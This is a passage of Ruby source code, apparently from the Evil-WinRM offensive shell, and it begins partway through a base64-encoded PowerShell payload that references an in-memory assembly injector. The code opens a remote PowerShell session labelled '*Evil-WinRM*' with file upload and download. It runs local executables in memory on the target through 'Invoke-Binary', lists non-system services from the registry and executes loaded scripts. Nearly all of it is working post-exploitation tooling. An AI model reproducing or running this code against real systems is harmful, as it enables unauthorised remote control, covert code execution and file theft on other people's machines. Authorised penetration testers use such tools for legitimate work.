MCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCkpIHwgb3V0LW51bGwgCltDYWJlc2hhLkluamVjdG9yXTo6RXhlY3V0ZSgkYXJndW1lbnRvcykKfQoKZnVuY3Rpb24gc2hvdy1tZXRob2RzLWxvYWRlZCB7JGdsb2JhbDpzaG93bWV0aG9kc30K")
        self.silent_warnings do
            $LIST = $LIST + functions
        end

        completion =
            proc do |str|
              case
              when Readline.line_buffer =~ /help.*/i
                puts("#{$LIST.join("\t")}")
              when Readline.line_buffer =~ /\[*/i
                $LISTASSEM.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?              
              when Readline.line_buffer =~ /Invoke-Binary.*/i
                executables.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              when Readline.line_buffer =~ /upload.*/i
                paths = self.paths(str)
                paths.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              else
                $LIST.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
              end
            end

        Readline.completion_proc = completion
        Readline.completion_append_character = ''

        command = ""

        begin
            print_message("Establishing connection to remote endpoint", TYPE_INFO)
            $conn.shell(:powershell) do |shell|
                until command == "exit" do

                    pwd = shell.run("(get-location).path").output.strip
                    command = Readline.readline("*Evil-WinRM*".red + " PS ".yellow + pwd + "> ", true) # True for command history

                    if command.start_with?('upload') then
                        upload_command = command.tokenize
                        command = ""

                        # If the file to upload exists in current dir, is not needed to set upload name, otherwise must be done
                        if upload_command[2].to_s.empty? then upload_command[2] = "." end
                        begin
                            self.print_message("Uploading " + upload_command[1] + " to " + upload_command[2], TYPE_INFO)
                            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes|
                            self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA)
                            self.print_message("Upload successful!", TYPE_INFO)
                          end
                        rescue
                            self.print_message("Upload failed. Check file names", TYPE_ERROR)
                        end

                    elsif command.start_with?('download') then
                        download_command = command.tokenize
                        command = ""

                        # If the file to download exists in current dir, is not needed to set download name, otherwise must be done
                        if download_command[2].to_s.empty? then download_command[2] = download_command[1] end
                        begin
                            self.print_message("Downloading " + download_command[1] + " to " + download_command[2], TYPE_INFO)
                            file_manager.download(download_command[1], download_command[2])
                            self.print_message("Download successful!", TYPE_INFO)
                        rescue
                            self.print_message("Download failed. Check file names", TYPE_ERROR)
                        end

                    elsif command.start_with?('Invoke-Binary') then
                        begin
                            invoke_Binary = command.tokenize
                            command = ""
                            load_executable = invoke_Binary[1]
                            load_executable = File.binread(load_executable)
                            load_executable = Base64.strict_encode64(load_executable)

                            if !invoke_Binary[4].to_s.empty? && invoke_Binary[5].to_s.empty?
                                output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3] + "," + invoke_Binary[4])
                            elsif !invoke_Binary[3].to_s.empty? && invoke_Binary[4].to_s.empty?
                                output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3])
                            elsif !invoke_Binary[2].to_s.empty? && invoke_Binary[3].to_s.empty?
                                output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2])
                            elsif invoke_Binary[2].to_s.empty?
                                output = shell.run("Invoke-Binary " + load_executable)
                            end
                            print(output.output)
                        rescue
                            self.print_message("Check file names", TYPE_ERROR)
                        end

                    elsif command.start_with?('services') then
                        command = ""
                        output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
                        print(output.output.chomp)

                    elsif command.start_with?(*functions) then
                        self.silent_warnings do
                            load_script = $scripts_path + command
                            command = ""
                            load_script = load_script.gsub(" ","")
                            load_script = File.binread(load_script)
                            output = shell.run(load_script)
                        end

                    elsif command.start_with?('menu') then
                        command = ""
                        self.silent_warnings do
                            output = shell.run(menu)
                            output = shell.run("Menu")
                            autocomplete = shell.run("auto").output.chomp
                            autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                            assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                            assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                            if !assemblyautocomplete.to_s.empty?
                                $LISTASSEMNOW = assemblyautocomplete.split("\n")
                                $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                            end
                            $LIST2 = autocomplete.split("\n")
                            $LIST = $LIST + $LIST2
                            print(output.output)
                        end
                    end

                    output = shell.run(command) do |stdout, stderr|
                        STDOUT.print(stdout)
                        STDERR.print(stderr)
                    end
                end

                self.custom_exit(0)
            end
        rescue
            self.print_message("Can't establish connection. Check connection params", TYPE_ERROR)
            self.custom_exit(1)
        end
    end
end

# Class to create array (tokenize) from a string
class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

# Execution
e = EvilWinRM.new
e.main
